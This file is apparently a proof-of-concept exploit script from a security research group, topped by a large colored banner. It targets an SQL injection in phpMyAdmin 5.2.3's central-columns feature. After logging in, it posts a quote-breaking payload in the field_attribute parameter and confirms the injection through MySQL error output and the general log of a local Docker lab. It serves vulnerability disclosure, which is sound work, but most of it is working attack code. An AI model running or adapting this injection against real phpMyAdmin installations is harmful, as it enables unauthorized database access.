#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: phpmyadmin-pmadb-central-sqli (High: 8.1)
#  Vendor: phpMyAdmin (phpMyAdmin)
#  Versions: phpMyAdmin 5.2.3 (pmadb central columns)
#  Impact: Central columns col_extra / field_attribute unescaped on control-user SQL
#  Requires: authenticated cookie login; pmadb; loopback 127.0.0.1:19210
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "phpmyadmin-pmadb-central-sqli"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""phpMyAdmin 5.2.3 central columns pmadb SQLi (unescaped extra/attribute)."""


import html as htmlmod
import http.cookiejar
import os
import re
import subprocess
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

LABEL = "phpmyadmin-pmadb-central-sqli"
WITNESS = "PMA-PMADB-CENTRAL-SQLI-WITNESS"
BASE = os.environ.get("PMA_URL", "http://127.0.0.1:19210").rstrip("/")
COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", "phpmyadmin-pmadb-central-sqli")
HERE = Path(__file__).resolve().parent
USER = "appuser"
PASSWORD = "apppass"
DB = "appdb"
NEG_NAME = "neg'col"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    raise SystemExit(1)


def success(detail: str) -> None:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    raise SystemExit(0)


def sanitize(text: str) -> str:
    return text.replace("\n", " ").replace("\r", " ")[:240]


def extract_named(name: str, body: str) -> str | None:
    pattern = (
        rf'name="{re.escape(name)}"[^>]*value="([^"]*)"'
        rf'|value="([^"]*)"[^>]*name="{re.escape(name)}"'
    )
    match = re.search(pattern, body, re.I)
    if not match:
        return None
    return htmlmod.unescape(match.group(1) or match.group(2))


class Client:
    def __init__(self, base: str) -> None:
        self.base = base.rstrip("/")
        jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    def request(
        self,
        path: str,
        method: str = "GET",
        form: dict[str, str] | None = None,
        timeout: int = 30,
    ) -> tuple[int, str]:
        url = path if path.startswith("http") else self.base + path
        data = None
        headers = {"User-Agent": "pma-central-sqli-lab"}
        if form is not None:
            data = urllib.parse.urlencode(form).encode("utf-8")
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with self.opener.open(req, timeout=timeout) as resp:
                return int(resp.status), resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", "replace")
            return int(exc.code), body
        except OSError as exc:
            return 0, sanitize(str(exc))


def mysql_query(sql: str) -> str:
    proc = subprocess.run(
        [
            "docker",
            "compose",
            "-p",
            COMPOSE,
            "exec",
            "-T",
            "db",
            "mysql",
            "-uroot",
            "-plabroot",
            "-N",
            "-e",
            sql,
        ],
        cwd=HERE,
        check=False,
        capture_output=True,
        text=True,
    )
    if proc.returncode != 0:
        err = sanitize(proc.stderr or proc.stdout)
        fail(f"mysql-query-failed rc={proc.returncode} {err}")
    return proc.stdout


def enable_general_log() -> None:
    mysql_query("SET GLOBAL log_output='TABLE'")
    mysql_query("SET GLOBAL general_log=1")
    mysql_query("SET GLOBAL general_log='ON'")


def general_log_text() -> str:
    stats = mysql_query(
        "SELECT @@global.general_log, @@global.log_output, "
        "(SELECT COUNT(*) FROM mysql.general_log)"
    )
    log(f"IOC general-log-vars {sanitize(stats)}")
    return mysql_query(
        "SELECT IFNULL(CONVERT(argument USING utf8mb4), '') FROM mysql.general_log "
        "WHERE CONVERT(argument USING utf8mb4) LIKE '%central_columns%' "
        "OR CONVERT(argument USING utf8mb4) LIKE '%neg%' "
        "OR CONVERT(argument USING utf8mb4) LIKE '%WITNESS%' "
        "OR CONVERT(argument USING utf8mb4) LIKE '%poscol%'"
    )


def table_names() -> str:
    return mysql_query(
        "SELECT col_name FROM phpmyadmin.pma__central_columns WHERE db_name='appdb'"
    )


def central_save(
    token: str,
    orig: str,
    name: str,
    attribute: str,
    extra: str,
) -> dict[str, str]:
    return {
        "db": DB,
        "server": "1",
        "token": token,
        "ajax_request": "1",
        "multi_edit_central_column_save": "1",
        "orig_col_name[0]": orig,
        "field_name[0]": name,
        "field_type[0]": "INT",
        "field_length[0]": "11",
        "field_collation[0]": "",
        "field_attribute[0]": attribute,
        "col_extra[0]": extra,
        "field_default_type[0]": "NONE",
        "field_default_value[0]": "",
    }


def login(client: Client) -> str:
    status, body = client.request("/index.php?route=/")
    token = extract_named("token", body)
    set_session = extract_named("set_session", body)
    if not token:
        fail(f"no-csrf-token login-http={status}")
    status, body = client.request(
        "/index.php?route=/",
        method="POST",
        form={
            "pma_username": USER,
            "pma_password": PASSWORD,
            "server": "1",
            "token": token,
            "set_session": set_session or "",
        },
    )
    still_login = 'name="pma_username"' in body or "pma_username" in body
    log(f"IOC password-login http={status} still-login={still_login}")
    if still_login:
        fail("login-rejected")
    status, body = client.request(f"/index.php?route=/database/central-columns&db={DB}")
    if status != 200:
        fail(f"central-columns-http={status}")
    lowered = body.lower()
    if "configuration storage is not ready" in lowered or "not configured" in lowered:
        fail("pmadb-central-columns-disabled")
    token2 = extract_named("token", body)
    if not token2:
        fail("no-csrf-token central-columns-page")
    log("IOC central-columns-page http=200")
    return token2


def main() -> int:
    log(f"IOC target={BASE} compose={COMPOSE}")
    enable_general_log()
    client = Client(BASE)
    token = login(client)

    neg_status, neg_body = client.request(
        "/index.php?route=/database/central-columns",
        method="POST",
        form=central_save(token, "", NEG_NAME, "", ""),
    )
    token = extract_named("token", neg_body) or token
    neg_not_ready = "configuration storage is not ready" in neg_body.lower()
    log(f"IOC negative-escaped-name http={neg_status} not-ready={neg_not_ready}")
    if neg_not_ready:
        fail("pmadb-central-columns-disabled")

    pos_status, pos_body = client.request(
        "/index.php?route=/database/central-columns",
        method="POST",
        form=central_save(token, "", "poscol", f"' {WITNESS}", ""),
    )
    syntax = "syntax" in pos_body.lower() or "you have an error in your sql" in pos_body.lower()
    witness_in_error = WITNESS in pos_body
    log(
        f"IOC positive-unescaped-attr http={pos_status} sql-syntax={syntax} "
        f"witness-in-error={witness_in_error} body={sanitize(pos_body)}"
    )

    names = table_names()
    neg_stored = "neg'col" in names
    pos_stored = "poscol" in names
    log(f"IOC pmadb-rows neg-stored={neg_stored} pos-stored={pos_stored} names={sanitize(names)}")

    slog = general_log_text()
    log(f"IOC general-log-snippet {sanitize(slog)}")
    escaped_name = "neg\\'col" in slog or "neg''col" in slog
    unescaped_witness = WITNESS in slog and (
        f"' {WITNESS}" in slog or f"'' {WITNESS}" in slog or f",' {WITNESS}" in slog
    )
    log(
        f"IOC general-log escaped-name={escaped_name} unescaped-witness={unescaped_witness}"
    )
    if not neg_stored:
        fail("negative-control-escaped-name-not-inserted")
    if pos_stored:
        fail("positive-payload-inserted-without-break")
    if not witness_in_error and not unescaped_witness:
        fail("witness-not-in-control-user-error-or-general-log")
    if not syntax:
        fail("control-user-sql-syntax-error-missing")
    success(
        "how=live insert-syntax=yes field-name-escaped=yes "
        f"general-log-unescaped={str(unescaped_witness).lower()} "
        f"error-has-witness={str(witness_in_error).lower()}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

